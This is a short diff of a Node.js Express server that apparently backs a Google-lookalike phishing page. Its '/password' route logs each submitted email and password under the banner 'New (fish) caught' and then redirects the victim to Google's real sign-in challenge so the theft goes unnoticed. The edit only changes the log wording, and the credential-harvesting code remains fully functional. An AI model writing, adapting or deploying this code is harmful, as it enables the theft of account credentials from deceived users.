@@ -15,9 +15,9 @@ app.post('/accountLoginInfoXhr',
 	(req, res) => res.json({ "email": req.body.Email }));
 app.post('/password',
 	(req, res) => {
-		console.log('New \u1F41F:');
-		console.log("Email: " + req.body.Email); 
-		console.log("Passw: " + req.body.Passwd); 
+		console.log('New (fish) caught:');
+		console.log("Email: " + req.body.Email);
+		console.log("Passw: " + req.body.Passwd);
 		res.redirect('https://accounts.google.com/signin/challenge/sl/password');
 	});
 
